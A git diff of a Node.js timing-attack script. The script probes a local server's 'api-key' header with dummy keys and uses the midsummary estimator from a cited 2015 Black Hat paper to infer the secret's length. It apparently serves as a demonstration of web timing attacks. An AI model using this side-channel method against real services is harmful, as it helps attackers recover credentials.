@@ -1,36 +1,13 @@
-const http = require('http');
 const Statistics = require('statistics.js');
+const { makeRequest } = require("./lib/request");
 
-const MAX_LEN = 32;
-const N_OBSERVATIONS = 20;
-const REPORT_EVERY = 2 * N_OBSERVATIONS * MAX_LEN;
-
-async function makeRequest(key) {
-  return new Promise((resolve, reject) => {
-    const options = {
-      hostname: 'localhost',
-      port: 3000,
-      path: '/',
-      method: 'GET',
-      headers: { 'api-key': key },
-    };
-
-    const tStart = process.hrtime();
-    const req = http.request(options, res => {
-      const tDiff = process.hrtime(tStart);
-      res.on('data', data => {
-        resolve([data.toString(), tDiff]);
-      });
-    });
-
-    req.on('error', error => {
-      reject(error);
-    });
-
-    req.end();
-  });
-}
-
+const MAX_PWD_LEN = 32;
+const N_OBSERVATIONS_PER_ROUND = 20;
+// multiply by some small positive integer (1 < n < 10)
+// to make sure we "warm up" before doing actual measurements.
+// Probably not necessary, but also useful to fully refresh
+// the list of measurements b/w rounds.
+const REPORT_EVERY_N_OBSERVATIONS = 2 * N_OBSERVATIONS_PER_ROUND * MAX_PWD_LEN;
 
 /**
  * @typedef {[seconds: number, nanoseconds: number]} TimeSpan
@@ -75,19 +52,6 @@ function compare(t1, t2) {
 }
 
 /**
- * @param arr {number[]}
- * @return {number}
- */
-function harmonicMean(arr) {
-  let sum = 0;
-  for (let i = 0; i < arr.length; i++) {
-    sum = sum + (1 / arr[i]);
-  }
-
-  return arr.length/sum;
-}
-
-/**
  * @param t {TimeSpan}
  * @return {number}
  */
@@ -106,10 +70,12 @@ function numberToTimeSpan(n) {
 }
 
 /**
+ * Implements "midsummary" L-estimator from "Web Timing Attacks Made Practical" (Morgan & Morgan, 2015)
+ * @see <https://www.blackhat.com/docs/us-15/materials/us-15-Morgan-Web-Timing-Attacks-Made-Practical-wp.pdf>
  * @param ts {TimeSpan[]}
  * @return {TimeSpan}
  */
-function measure(ts) {
+function midsummary(ts) {
   const w = 10;
   const stats = new Statistics([], {});
   const numbers = ts.map(timeSpanToNumber);
@@ -120,26 +86,25 @@ function measure(ts) {
 }
 
 /**
- * @param t {TimeSpan}
- * @return {string}
- */
-function timeToString(t) {
-  return t[0].toString().padStart(3, ' ') + '.' + t[1].toString().padStart(9, '0');
-}
-
-/**
+ * Observations data, a map from password length to round trip times (RTT)
  * @type {{
  *   [key: number]: {
- *     times: TimeSpan[],
+ *     observations: TimeSpan[],
  *     count: number,
  *   }
  * }}
  */
-const lengths = {};
-
-let totalCount = 0;
+const observations = {};
 
 /**
+ * Total number of performed observations.
+ * @type {number}
+ */
+let totalObservations = 0;
+
+/**
+ * Counting how many times each password length came out on top,
+ * i.e., #1 in the list of longest observations (aggregated via some function)
  * @type {{
  *   [key: number]: number
  * }}
@@ -147,22 +112,22 @@ let totalCount = 0;
 const topPlaces = {};
 
 async function guessLength() {
-  const randomLen = Math.floor(Math.random() * MAX_LEN) + 1;
+  const randomLen = Math.floor(Math.random() * MAX_PWD_LEN) + 1;
   const dummyKey = '0'.repeat(randomLen);
 
   const [data, tDiff] = await makeRequest(dummyKey);
 
-  const times = lengths[randomLen]?.times ?? [];
-  const count = lengths[randomLen]?.count ?? 0;
-  lengths[randomLen] = {
-    times: [tDiff, ...times].slice(0, N_OBSERVATIONS),
-    count: count + 1,
+  const currentObservations = observations[randomLen]?.observations ?? [];
+  const currentCount = observations[randomLen]?.count ?? 0;
+  observations[randomLen] = {
+    observations: [tDiff, ...currentObservations].slice(0, N_OBSERVATIONS_PER_ROUND),
+    count: currentCount + 1,
   };
-  totalCount += 1;
+  totalObservations += 1;
 
-  if (totalCount % REPORT_EVERY === 0) {
-    const top = Object.keys(lengths)
-      .map(len => [len, measure(lengths[len].times), lengths[len].count])
+  if (totalObservations % REPORT_EVERY_N_OBSERVATIONS === 0) {
+    const top = Object.keys(observations)
+      .map(len => [len, midsummary(observations[len].observations), observations[len].count])
       .sort((a, b) => compare(a[1], b[1]));
     const [topLen] = top[0];
     if (topPlaces[topLen] == null) {
@@ -170,22 +135,16 @@ async function guessLength() {
     }
     topPlaces[topLen] += 1;
 
-    // const report = top.map(([len, measure, count]) => [
-    //     len.toString().padStart(2, '0'),
-    //     timeToString(measure),
-    //     count,
-    //   ].join(' '))
-    //   .join("\n");
-
     const report = Object.keys(topPlaces).map(l => [l, topPlaces[l]])
       .sort((a, b) => b[1] - a[1])
-      .slice(0, 5)
-      .map(row => row[0].padStart(2, ' ') + ': ' + row[1] + ' time(s)')
+      .slice(0, 5) // report only top 5
+      .map(row => `${row[0].padStart(2, ' ')} was the slowest ${row[1]} time(s)`)
       .join("\n");
-    console.log(report + "\n");
+    console.log("\n" + report);
   }
 
   setTimeout(() => guessLength(), 0);
 }
 
+// start the infinity loop, finish by pressing Ctrl-C
 guessLength();
